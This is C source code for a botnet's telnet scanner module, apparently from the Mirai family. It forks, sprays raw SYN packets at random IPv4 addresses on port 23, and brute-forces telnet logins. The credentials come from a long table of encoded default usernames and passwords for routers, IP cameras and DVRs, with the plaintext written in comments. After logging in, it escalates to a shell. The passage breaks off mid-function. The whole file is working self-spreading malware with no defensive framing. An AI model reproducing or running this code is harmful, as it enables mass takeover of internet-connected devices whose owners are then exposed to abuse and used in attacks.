#define _GNU_SOURCE


#ifdef DEBUG
#include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <string.h>
#include <linux/ip.h>
#include <linux/tcp.h>

#include "includes.h"
#include "scanner.h"
#include "table.h"
#include "rand.h"
#include "util.h"
#include "checksum.h"
#include "resolv.h"

int scanner_pid, rsck, rsck_out, auth_table_len = 0;
char scanner_rawpkt[sizeof (struct iphdr) + sizeof (struct tcphdr)] = {0};
struct scanner_auth *auth_table = NULL;
struct scanner_connection *conn_table;
uint16_t auth_table_max_weight = 0;
uint32_t fake_time = 0;

int recv_strip_null(int sock, void *buf, int len, int flags)
{
    int ret = recv(sock, buf, len, flags);

    if (ret > 0)
    {
        int i = 0;

        for(i = 0; i < ret; i++)
        {
            if (((char *)buf)[i] == 0x00)
            {
                ((char *)buf)[i] = 'A';
            }
        }
    }

    return ret;
}

void scanner_init(void)
{
    int i;
    uint16_t source_port;
    struct iphdr *iph;
    struct tcphdr *tcph;

    // Let parent continue on main thread
    scanner_pid = fork();
    if (scanner_pid > 0 || scanner_pid == -1)
        return;

    LOCAL_ADDR = util_local_addr();

    rand_init();
    fake_time = time(NULL);
    conn_table = calloc(SCANNER_MAX_CONNS, sizeof (struct scanner_connection));
    for (i = 0; i < SCANNER_MAX_CONNS; i++)
    {
        conn_table[i].state = SC_CLOSED;
        conn_table[i].fd = -1;
    }

    // Set up raw socket scanning and payload
    if ((rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("[scanner] Failed to initialize raw socket, cannot scan\n");
#endif
        exit(0);
    }
    fcntl(rsck, F_SETFL, O_NONBLOCK | fcntl(rsck, F_GETFL, 0));
    i = 1;
    if (setsockopt(rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof (i)) != 0)
    {
#ifdef DEBUG
        printf("[scanner] Failed to set IP_HDRINCL, cannot scan\n");
#endif
        close(rsck);
        exit(0);
    }

    do
    {
        source_port = rand_next() & 0xffff;
    }
    while (ntohs(source_port) < 1024);

    iph = (struct iphdr *)scanner_rawpkt;
    tcph = (struct tcphdr *)(iph + 1);

    // Set up IPv4 header
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr));
    iph->id = rand_next();
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    // Set up TCP header
    tcph->dest = htons(23);
    tcph->source = source_port;
    tcph->doff = 5;
    tcph->window = rand_next() & 0xffff;
    tcph->syn = TRUE;

    // Set up passwords
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x56\x12\x4D\x50\x52\x54", 10); // admin v2mprt
    add_auth_entry("\x44\x45\x46\x41\x55\x4C\x54", "\x56\x12\x4D\x50\x52\x54", 10); // default v2mprt
    add_auth_entry("\x54\x45\x4C\x4E\x45\x54\x41\x44\x4D\x49\x4E", "\x54\x45\x4C\x4E\x45\x54\x41\x44\x4D\x49\x4E", 10); // telnetadmin telnetadmin
    add_auth_entry("\x45\x18\x54\x45\x4C\x4E\x45\x54", "\x45\x18\x54\x45\x4C\x4E\x45\x54", 10); // e8telnet e8telnet
    add_auth_entry("\x45\x18\x45\x48\x4F\x4D\x45", "\x45\x18\x45\x48\x4F\x4D\x45", 10); // e8ehome e8ehome
    add_auth_entry("\x52\x4F\x4F\x54", "\x41\x44\x4D\x49\x4E\x68\x77", 10); // root adminHW
    add_auth_entry("\x45\x18\x45\x48\x4F\x4D\x45\x4C", "\x45\x18\x45\x48\x4F\x4D\x45\x4C", 10); // e8ehomel e8ehomel
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x48\x60\x13\x12\x6C\x55\x59\x64", 10); // admin h@32LuyD
    add_auth_entry("\x52\x4F\x4F\x54", "\x11\x10\x10\x11\x43\x48\x49\x4E", 10); // root 1001chin 
    add_auth_entry("\x52\x4F\x4F\x54", "\x15\x55\x50", 10); // root 5up
    add_auth_entry("\x56\x53\x54\x41\x52\x43\x41\x4D\x12\x10\x11\x15", "\x12\x10\x11\x15\x10\x16\x10\x12", 10); // vstarcam2015 20150602
    add_auth_entry("\x52\x4F\x4F\x54", "\x4A\x55\x41\x4E\x54\x45\x43\x48", 10); // root juantech
    add_auth_entry("\x52\x4F\x4F\x54", "\x5A\x4C\x58\x58\x0E", 10); // root zlxx.
    add_auth_entry("\x52\x4F\x4F\x54", "\x49\x56\x44\x45\x56", 10); // root ivdev
    add_auth_entry("\x52\x4F\x4F\x54", "\x48\x55\x4E\x54\x15\x17\x15\x19", 10); // root hunt5759
    add_auth_entry("\x52\x4F\x4F\x54", "\x17\x55\x4A\x6D\x4B\x4F\x10\x56\x49\x5A\x58\x56", 10); // root 7ujMko0vizxv
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x17\x55\x4A\x6D\x4B\x4F\x10\x41\x44\x4D\x49\x4E", 10); // admin 7ujMko0admin
    add_auth_entry("\x52\x4F\x4F\x54", "\x41\x4E\x54\x53\x4C\x51", 10); // root antslq
    add_auth_entry("\x52\x4F\x4F\x54", "\x4A\x56\x42\x5A\x44", 10); // root jvbzd
    add_auth_entry("\x52\x4F\x4F\x54", "\x58\x4D\x48\x44\x49\x50\x43", 10); // root xmhdipc
    add_auth_entry("\x52\x4F\x4F\x54", "\x41\x4E\x4B\x4F", 10); // root anko
    add_auth_entry("\x52\x4F\x4F\x54", "\x52\x4F\x4F\x54", 10); // root root
    add_auth_entry("\x52\x4F\x4F\x54", "\x58\x43\x13\x15\x11\x11", 10); // root xc3511
    add_auth_entry("\x52\x4F\x4F\x54", "\x56\x49\x5A\x58\x56", 10); // root vizxv
    add_auth_entry("\x52\x4F\x4F\x54", "\x52\x4F\x4F\x54\x11\x12\x13", 10); // root root123
    add_auth_entry("\x44\x41\x45\x4D\x4F\x4E", "\x44\x41\x45\x4D\x4F\x4E", 10); // daemon daemon
    add_auth_entry("\x44\x41\x45\x4D\x4F\x4E", "", 10); // daemon
    add_auth_entry("\x52\x4F\x4F\x54", "\x11\x12\x13\x14", 10); // root 1234
    add_auth_entry("\x52\x4F\x4F\x54", "\x18\x18\x18\x18\x18\x18\x18\x18", 10); // root 88888888
    add_auth_entry("\x52\x4F\x4F\x54", "\x11\x12\x13\x14\x15", 10); // root 12345
    add_auth_entry("\x52\x4F\x4F\x54", "\x50\x41\x53\x53\x57\x4F\x52\x44", 10); // root password
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x11\x12\x13\x14", 10); // admin 1234
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x41\x44\x4D\x49\x4E", 10); // admin admin
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x50\x41\x53\x53\x57\x4F\x52\x44", 10); // admin password
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x5A\x48\x4F\x4E\x47\x58\x49\x4E\x47", 10); // admin zhongxing
    add_auth_entry("\x52\x4F\x4F\x54", "\x49\x50\x43\x41\x4D\x7F\x52\x54\x15\x13\x15\x10", 10); // root ipcam_rt5350
    add_auth_entry("\x55\x53\x45\x52", "\x55\x53\x45\x52", 10); // user user
    add_auth_entry("\x55\x53\x45\x52", "\x50\x41\x53\x53", 10); // user pass
    add_auth_entry("\x55\x53\x45\x52", "\x50\x41\x53\x53\x57\x4F\x52\x44", 10); // user password
    add_auth_entry("\x55\x53\x45\x52", "\x11\x12\x13\x14\x15", 10); // user 12345
    add_auth_entry("\x47\x55\x45\x53\x54", "\x47\x55\x45\x53\x54", 10); // guest guest
    add_auth_entry("\x47\x55\x45\x53\x54", "\x50\x41\x53\x53", 10); // guest pass
    add_auth_entry("\x47\x55\x45\x53\x54", "\x50\x41\x53\x53\x57\x4F\x52\x44", 10); // guest password
    add_auth_entry("\x47\x55\x45\x53\x54", "\x11\x12\x13\x14\x15", 10); // guest 12345
    add_auth_entry("\x53\x55\x50\x50\x4F\x52\x54", "\x53\x55\x50\x50\x4F\x52\x54", 10); // support support
    add_auth_entry("\x53\x55\x50\x50\x4F\x52\x54", "\x53\x55\x50\x50\x4F\x52\x54\x11\x12\x13", 10); // support support123
    add_auth_entry("\x53\x55\x50\x50\x4F\x52\x54", "\x50\x41\x53\x53", 10); // support pass
    add_auth_entry("\x53\x55\x50\x50\x4F\x52\x54", "\x50\x41\x53\x53\x57\x4F\x52\x44", 10); // support password
    add_auth_entry("\x53\x55\x50\x50\x4F\x52\x54", "\x11\x12\x13\x14\x15", 10); // support 12345
    add_auth_entry("\x44\x45\x46\x41\x55\x4C\x54", "\x44\x45\x46\x41\x55\x4C\x54", 10); // default default
    add_auth_entry("\x44\x45\x46\x41\x55\x4C\x54", "\x50\x41\x53\x53\x57\x4F\x52\x44", 10); // default password
    add_auth_entry("\x44\x45\x46\x41\x55\x4C\x54", "\x50\x41\x53\x53", 10); // default pass
    add_auth_entry("\x44\x45\x46\x41\x55\x4C\x54", "\x11\x12\x13\x14\x15", 10); // default 12345
    add_auth_entry("\x44\x45\x46\x41\x55\x4C\x54", "\x6F\x58\x48\x4C\x57\x73\x67\x18", 10); // default OxhlwSG8
    add_auth_entry("\x44\x45\x46\x41\x55\x4C\x54", "\x4C\x6A\x57\x50\x42\x4F\x16", 10); // default lJwpbo6
    add_auth_entry("\x44\x45\x46\x41\x55\x4C\x54", "\x73\x12\x46\x67\x51\x6E\x66\x53", 10); // default S2fGqNFs
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x4D\x45\x49\x4E\x53\x4D", 10); // admin meinsm
    add_auth_entry("\x52\x4F\x4F\x54", "\x67\x6D\x18\x11\x18\x12", 10); // root GM8182
    add_auth_entry("\x56\x4F\x4C\x49\x54\x49\x4F\x4E", "\x56\x4F\x4C\x49\x54\x49\x4F\x4E", 10); // volition volition
    add_auth_entry("\x42\x49\x4E", "", 10); // bin
    add_auth_entry("\x41\x44\x4D", "", 10); // adm
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x4B\x4F\x4E\x54\x12\x10\x10\x14", 10); // admin kont2004
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x48\x4F\x14\x55\x4B\x55\x16\x41\x54", 10); // admin ho4uku6at
    add_auth_entry("\x52\x4F\x4F\x54", "\x48\x47\x12\x58\x10", 10); // root hg2x0
    add_auth_entry("\x52\x4F\x4F\x54", "\x11\x12\x13\x14\x15\x16", 10); // root 123456
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x10\x10\x10\x10", 10); // admin 0000
    add_auth_entry("\x11\x12\x13", "\x11\x12\x13", 10); // 123 123
    add_auth_entry("\x46\x54\x50", "\x46\x54\x50", 10); // ftp ftp
    add_auth_entry("\x52\x4F\x4F\x54", "\x7A\x54\x45\x15\x12\x11", 10); // root Zte521
    add_auth_entry("\x42\x41\x42\x59", "\x42\x41\x42\x59", 10); // baby baby
    add_auth_entry("\x52\x4F\x4F\x54", "\x4B\x4F\x50\x50", 10); // root kopp
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x54\x53\x55\x4E\x41\x4D\x49", 10); // admin tsunami
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x15\x14\x13\x12\x11", 10); // admin 54321
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x16\x16\x16\x16\x16\x16", 10); // admin 666666
    add_auth_entry("\x55\x42\x4E\x54", "\x55\x42\x4E\x54", 10); // ubnt ubnt
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x4D\x4F\x54\x4F\x52\x4F\x4C\x41", 10); // admin motorola
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x19\x19\x19\x19\x19\x19\x19\x19", 10); // admin 99999999
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x56\x4E\x50\x54", 10); // admin vnpt
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x44\x49\x41\x4D\x4F\x4E\x44", 10); // admin diamond
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x43\x4F\x4E\x45\x58\x41\x4E\x54", 10); // admin conexant
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x41\x54\x4C\x41\x4E\x54\x49\x53", 10); // admin atlantis
    add_auth_entry("\x4A\x4E\x49\x4F\x52", "\x4A\x4E\x49\x4F\x52", 10); // jnior jnior
    add_auth_entry("\x4A\x4E\x49\x4F\x52", "\x11\x12\x13\x14", 10); // jnior 1234
    add_auth_entry("\x52\x4F\x4F\x54", "\x54\x49\x4E\x49", 10); // root tini
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x63\x45\x4E\x54\x55\x52\x59\x6C\x11\x4E\x4B", 10); // admin CenturyL1nk
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x63\x74\x6C\x73\x55\x50\x50\x4F\x52\x54\x11\x12", 10); // admin CTLSupport12
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x71\x57\x45\x53\x54\x6D\x10\x44\x45\x4D", 10); // admin QwestM0dem
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x58\x41\x44\x03\x11\x12", 10); // admin xad$l#12
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x4E\x49\x4D\x44\x41", 10); // admin nimda
    add_auth_entry("\x53\x55\x50\x45\x52", "\x52\x4F\x4F\x54", 10); // super root
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x45\x50\x49\x43\x52\x4F\x55\x54\x45\x52", 10); // admin epicrouter
    add_auth_entry("\x54\x45\x4C\x45\x43\x4F\x4D\x41\x44\x4D\x49\x4E", "\x4E\x65\x17\x4A\x61\x05\x15\x4D", 10); // telecomadmin nE7jA%5m
    add_auth_entry("\x53\x55\x50\x45\x52\x56\x49\x53\x4F\x52", "\x5A\x59\x41\x44\x11\x12\x13\x14", 10); // supervisor zyad1234
    add_auth_entry("\x53\x55\x50\x45\x52\x41\x44\x4D\x49\x4E", "\x69\x53\x60\x44\x4D\x49\x4E", 10); // superadmin Is$uper@dmin
    add_auth_entry("\x54\x4D\x41\x44\x4D\x49\x4E", "\x54\x4D\x41\x44\x4D\x49\x4E", 10); // tmadmin tmadmin
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x13\x16\x12\x17\x12\x19", 10); // admin 362729
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x47\x56\x54\x11\x12\x13\x14\x15", 10); // admin gvt12345
    add_auth_entry("\x7A\x78\x64\x73\x6C", "\x7A\x78\x64\x73\x6C", 10); // ZXDSL ZXDSL
    add_auth_entry("\x54\x45\x43\x48", "\x54\x45\x43\x48", 10); // tech tech
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x12\x4F\x49\x49\x44\x58\x49\x49\x12\x12", 10); // admin 2oiidxii22
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x11\x19\x17\x16\x11\x12\x11\x13", 10); // admin 19761213
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x14\x12\x17\x16\x13\x16\x15", 10); // admin 4276365
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x42\x41\x59\x41\x4E\x44\x53\x4C", 10); // admin bayandsl
    add_auth_entry("\x52\x4F\x4F\x54", "\x56\x45\x52\x54\x45\x58\x12\x15\x45\x4B\x54\x4B\x53\x11\x12\x13", 10); // root vertex25ektks123
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x41\x51\x55\x41\x52\x49\x4F", 10); // admin aquario
    add_auth_entry("\x44\x41\x56\x4F", "\x44\x52\x43", 10); // davo drc
    add_auth_entry("\x52\x4F\x4F\x54", "\x48\x49\x4B\x56\x49\x53\x49\x4F\x4E", 10); // root hikvision
    add_auth_entry("\x48\x49\x4B\x56\x49\x53\x49\x4F\x4E", "\x48\x49\x4B\x56\x49\x53\x49\x4F\x4E", 10); // hikvision hikvision
    add_auth_entry("\x4D\x47\x13\x15\x10\x10", "\x4D\x45\x52\x4C\x49\x4E", 10); // mg3500 merlin
    add_auth_entry("\x52\x4F\x4F\x54", "\x53\x56\x47\x4F\x44\x49\x45", 10); // root svgodie
    add_auth_entry("\x44\x52\x41\x59\x54\x45\x4B", "\x11\x12\x13\x14", 10); // draytek 1234
    add_auth_entry("\x54\x45\x4C\x45\x43\x4F\x4D", "\x54\x45\x4C\x45\x43\x4F\x4D", 10); // telecom telecom
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x53\x4D\x43\x41\x44\x4D\x49\x4E", 10); // admin smcadmin
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x41\x44\x53\x4C\x52\x4F\x4F\x54", 10); // admin adslroot
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x41\x44\x4D\x49\x4E\x10\x11", 10); // admin admin01
    add_auth_entry("\x53\x55\x50\x45\x52", "\x53\x50\x0D\x41\x44\x4D\x49\x4E", 10); // super sp-admin
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x53\x50\x0D\x41\x44\x4D\x49\x4E", 10); // admin sp-admin
    add_auth_entry("\x52\x4F\x4F\x54", "\x48\x55\x49\x47\x55\x13\x10\x19", 10); // root huigu309
    add_auth_entry("\x54\x45\x4C\x4E\x45\x54", "\x54\x45\x4C\x4E\x45\x54", 10); // telnet telnet
    add_auth_entry("\x52\x4F\x4F\x54", "\x12\x10\x10\x18\x10\x18\x12\x16", 10); // root 20080826
    add_auth_entry("\x52\x4F\x4F\x54", "\x54\x54\x4E\x45\x54", 10); // root ttnet
    add_auth_entry("\x52\x4F\x4F\x54", "\x41\x44\x4D\x49\x4E", 10); // root admin
    add_auth_entry("\x52\x4F\x4F\x54", "\x10\x10\x10\x10\x10", 10); // root 00000
    add_auth_entry("\x44\x41\x45\x4D\x4F\x4E", "", 10); // daemon
    add_auth_entry("\x44\x41\x45\x4D\x4F\x4E", "\x44\x41\x45\x4D\x4F\x4E", 10); // daemon
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x41\x44\x4D\x49\x4E\x11\x12\x13\x14", 10); // admin admin1234
    add_auth_entry("\x52\x4F\x4F\x54", "\x16\x16\x16\x16\x16\x16", 10); // root 666666
    add_auth_entry("\x52\x4F\x4F\x54", "\x15\x14\x13\x12\x11", 10); // root 54321
    add_auth_entry("\x52\x4F\x4F\x54", "\x4B\x4C\x56\x11\x12\x13", 10); // root klv123
    add_auth_entry("\x52\x4F\x4F\x54", "\x4B\x4C\x56\x11\x12\x13\x14", 10); // root klv1234
    add_auth_entry("\x61\x44\x4D\x49\x4E\x49\x53\x54\x52\x41\x54\x4F\x52", "\x41\x44\x4D\x49\x4E", 10); // Administrator admin
    add_auth_entry("\x53\x59\x53\x54\x45\x4D", "\x53\x59\x53\x54\x45\x4D", 10); // service service
    add_auth_entry("\x53\x55\x50\x45\x52\x56\x49\x53\x4F\x52", "\x53\x55\x50\x45\x52\x56\x49\x53\x4F\x52", 10); // supervisor supervisor
    add_auth_entry("\x41\x44\x4D\x49\x4E\x11", "\x50\x41\x53\x53\x57\x4F\x52\x44", 10); // admin1 password
    add_auth_entry("\x41\x44\x4D\x49\x4E\x49\x53\x54\x52\x41\x54\x4F\x52", "\x11\x12\x13\x14", 10); // administrator 1234
    add_auth_entry("\x52\x4F\x4F\x54", "\x48\x49\x13\x15\x11\x18", 10); // root hi3518
    add_auth_entry("\x52\x4F\x4F\x54", "\x49\x4B\x57\x42", 10); // root ikwb
    add_auth_entry("\x52\x4F\x4F\x54", "\x44\x52\x45\x41\x4D\x42\x4F\x58", 10); // root dreambox
    add_auth_entry("\x52\x4F\x4F\x54", "\x55\x53\x45\x52", 10); // root user
    add_auth_entry("\x52\x4F\x4F\x54", "\x52\x45\x41\x4C\x54\x45\x4B", 10); // root realtek
    add_auth_entry("\x52\x4F\x4F\x54", "\x10\x10\x10\x10\x10\x10\x10\x10", 10); // root 00000000
    add_auth_entry("\x41\x44\x4D\x49\x4E", "\x11\x11\x11\x11\x11\x11\x11", 10); // admin 1111111
    add_auth_entry("\x52\x4F\x4F\x54", "\x17\x55\x4A\x6D\x4B\x4F\x10\x41\x44\x4D\x49\x4E", 10); // root 7ujMko0admin
    add_auth_entry("\x52\x4F\x4F\x54", "\x53\x59\x53\x54\x45\x4D", 10); // root system
    add_auth_entry("\x54\x45\x43\x48", "\x54\x45\x43\x48", 10); // tech tech
    add_auth_entry("\x41\x44\x4D\x49\x4E", "", 10); // admin 
    add_auth_entry("\x52\x4F\x4F\x54", "", 10); // root 
    add_auth_entry("\x18\x18\x18\x18\x18\x18", "\x18\x18\x18\x18\x18\x18", 10); // 888888 888888
    add_auth_entry("\x16\x16\x16\x16\x16\x16", "\x16\x16\x16\x16\x16\x16", 10); // 666666 666666
    add_auth_entry("\x52\x4F\x4F\x54", "\x5A\x59\x41\x44\x15\x10\x10\x11", 10); // root zyad5001

#ifdef DEBUG
    printf("[scanner] Scanner process initialized. Scanning started.\n");
#endif

    // Main logic loop
    while (TRUE)
    {
        fd_set fdset_rd, fdset_wr;
        struct scanner_connection *conn;
        struct timeval tim;
        int last_avail_conn, last_spew, mfd_rd = 0, mfd_wr = 0, nfds;

        // Spew out SYN to try and get a response
        if (fake_time != last_spew)
        {
            last_spew = fake_time;

            for (i = 0; i < SCANNER_RAW_PPS; i++)
            {
                struct sockaddr_in paddr = {0};
                struct iphdr *iph = (struct iphdr *)scanner_rawpkt;
                struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

                iph->id = rand_next();
                iph->saddr = LOCAL_ADDR;
                iph->daddr = get_random_ip();
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
                tcph->dest = htons(23);
                tcph->seq = iph->daddr;
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr)), sizeof (struct tcphdr));

                paddr.sin_family = AF_INET;
                paddr.sin_addr.s_addr = iph->daddr;
                paddr.sin_port = tcph->dest;

                sendto(rsck, scanner_rawpkt, sizeof (scanner_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof (paddr));
            }
        }

        // Read packets from raw socket to get SYN+ACKs
        last_avail_conn = 0;
        while (TRUE)
        {
            int n;
            char dgram[1514];
            struct iphdr *iph = (struct iphdr *)dgram;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            struct scanner_connection *conn;

            errno = 0;
            n = recvfrom(rsck, dgram, sizeof (dgram), MSG_NOSIGNAL, NULL, NULL);
            if (n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
                break;

            if (n < sizeof(struct iphdr) + sizeof(struct tcphdr))
                continue;
            if (iph->daddr != LOCAL_ADDR)
                continue;
            if (iph->protocol != IPPROTO_TCP)
                continue;
            if (tcph->source != htons(23))
                continue;
            if (tcph->dest != source_port)
                continue;
            if (!tcph->syn)
                continue;
            if (!tcph->ack)
                continue;
            if (tcph->rst)
                continue;
            if (tcph->fin)
                continue;
            if (htonl(ntohl(tcph->ack_seq) - 1) != iph->saddr)
                continue;

            conn = NULL;
            for (n = last_avail_conn; n < SCANNER_MAX_CONNS; n++)
            {
                if (conn_table[n].state == SC_CLOSED)
                {
                    conn = &conn_table[n];
                    last_avail_conn = n;
                    break;
                }
            }

            // If there were no slots, then no point reading any more
            if (conn == NULL)
                break;

            conn->dst_addr = iph->saddr;
            conn->dst_port = tcph->source;
            setup_connection(conn);
#ifdef DEBUG
            printf("[scanner] FD%d Attempting to brute found IP %d.%d.%d.%d\n", conn->fd, iph->saddr & 0xff, (iph->saddr >> 8) & 0xff, (iph->saddr >> 16) & 0xff, (iph->saddr >> 24) & 0xff);
#endif
        }

        // Load file descriptors into fdsets
        FD_ZERO(&fdset_rd);
        FD_ZERO(&fdset_wr);
        for (i = 0; i < SCANNER_MAX_CONNS; i++)
        {
            int timeout;

            conn = &conn_table[i];
            timeout = (conn->state > SC_CONNECTING ? 30 : 5);

            if (conn->state != SC_CLOSED && (fake_time - conn->last_recv) > timeout)
            {
#ifdef DEBUG
                printf("[scanner] FD%d timed out (state = %d)\n", conn->fd, conn->state);
#endif
                close(conn->fd);
                conn->fd = -1;

                // Retry
                if (conn->state > SC_HANDLE_IACS) // If we were at least able to connect, try again
                {
                    if (++(conn->tries) == 10)
                    {
                        conn->tries = 0;
                        conn->state = SC_CLOSED;
                    }
                    else
                    {
                        setup_connection(conn);
#ifdef DEBUG
                        printf("[scanner] FD%d retrying with different auth combo!\n", conn->fd);
#endif
                    }
                }
                else
                {
                    conn->tries = 0;
                    conn->state = SC_CLOSED;
                }
                continue;
            }

            if (conn->state == SC_CONNECTING)
            {
                FD_SET(conn->fd, &fdset_wr);
                if (conn->fd > mfd_wr)
                    mfd_wr = conn->fd;
            }
            else if (conn->state != SC_CLOSED)
            {
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd_rd)
                    mfd_rd = conn->fd;
            }
        }

        tim.tv_usec = 0;
        tim.tv_sec = 1;
        nfds = select(1 + (mfd_wr > mfd_rd ? mfd_wr : mfd_rd), &fdset_rd, &fdset_wr, NULL, &tim);
        fake_time = time(NULL);

        for (i = 0; i < SCANNER_MAX_CONNS; i++)
        {
            conn = &conn_table[i];

            if (conn->fd == -1)
                continue;

            if (FD_ISSET(conn->fd, &fdset_wr))
            {
                int err = 0, ret = 0;
                socklen_t err_len = sizeof (err);

                ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err == 0 && ret == 0)
                {
                    conn->state = SC_HANDLE_IACS;
                    conn->auth = random_auth_entry();
                    conn->rdbuf_pos = 0;
#ifdef DEBUG
                    printf("[scanner] FD%d connected. Trying %s:%s\n", conn->fd, conn->auth->username, conn->auth->password);
#endif
                }
                else
                {
#ifdef DEBUG
                    printf("[scanner] FD%d error while connecting = %d\n", conn->fd, err);
#endif
                    close(conn->fd);
                    conn->fd = -1;
                    conn->tries = 0;
                    conn->state = SC_CLOSED;
                    continue;
                }
            }

            if (FD_ISSET(conn->fd, &fdset_rd))
            {
                while (TRUE)
                {
                    int ret;

                    if (conn->state == SC_CLOSED)
                        break;

                    if (conn->rdbuf_pos == SCANNER_RDBUF_SIZE)
                    {
                        memmove(conn->rdbuf, conn->rdbuf + SCANNER_HACK_DRAIN, SCANNER_RDBUF_SIZE - SCANNER_HACK_DRAIN);
                        conn->rdbuf_pos -= SCANNER_HACK_DRAIN;
                    }
                    errno = 0;
                    ret = recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos, SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
                    if (ret == 0)
                    {
#ifdef DEBUG
                        printf("[scanner] FD%d connection gracefully closed\n", conn->fd);
#endif
                        errno = ECONNRESET;
                        ret = -1; // Fall through to closing connection below
                    }
                    if (ret == -1)
                    {
                        if (errno != EAGAIN && errno != EWOULDBLOCK)
                        {
#ifdef DEBUG
                            printf("[scanner] FD%d lost connection\n", conn->fd);
#endif
                            close(conn->fd);
                            conn->fd = -1;

                            // Retry
                            if (++(conn->tries) >= 10)
                            {
                                conn->tries = 0;
                                conn->state = SC_CLOSED;
                            }
                            else
                            {
                                setup_connection(conn);
#ifdef DEBUG
                                printf("[scanner] FD%d retrying with different auth combo!\n", conn->fd);
#endif
                            }
                        }
                        break;
                    }
                    conn->rdbuf_pos += ret;
                    conn->last_recv = fake_time;

                    while (TRUE)
                    {
                        int consumed = 0;

                        switch (conn->state)
                        {
                        case SC_HANDLE_IACS:
                            if ((consumed = consume_iacs(conn)) > 0)
                            {
                                conn->state = SC_WAITING_USERNAME;
#ifdef DEBUG
                                printf("[scanner] FD%d finished telnet negotiation\n", conn->fd);
#endif
                            }
                            break;
                        case SC_WAITING_USERNAME:
                            if ((consumed = consume_user_prompt(conn)) > 0)
                            {
                                send(conn->fd, conn->auth->username, conn->auth->username_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                conn->state = SC_WAITING_PASSWORD;
#ifdef DEBUG
                                printf("[scanner] FD%d received username prompt\n", conn->fd);
#endif
                            }
                            break;
                        case SC_WAITING_PASSWORD:
                            if ((consumed = consume_pass_prompt(conn)) > 0)
                            {
#ifdef DEBUG
                                printf("[scanner] FD%d received password prompt\n", conn->fd);
#endif

                                // Send password
                                send(conn->fd, conn->auth->password, conn->auth->password_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);

                                conn->state = SC_WAITING_PASSWD_RESP;
                            }
                            break;
                        case SC_WAITING_PASSWD_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("[scanner] FD%d received shell prompt\n", conn->fd);
#endif

                                // Send enable / system / shell / sh to session to drop into shell if needed
                                table_unlock_val(TABLE_SCAN_ENABLE);
                                tmp_str = table_retrieve_val(TABLE_SCAN_ENABLE, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(TABLE_SCAN_ENABLE);
                                conn->state = SC_WAITING_ENABLE_RESP;
                            }
                            break;
                        case SC_WAITING_ENABLE_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("[scanner] FD%d received sh prompt\n", conn->fd);
#endif

                                table_unlock_val(TABLE_SCAN_SYSTEM);
                                tmp_str = table_retrieve_val(TABLE_SCAN_SYSTEM, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(TABLE_SCAN_SYSTEM);

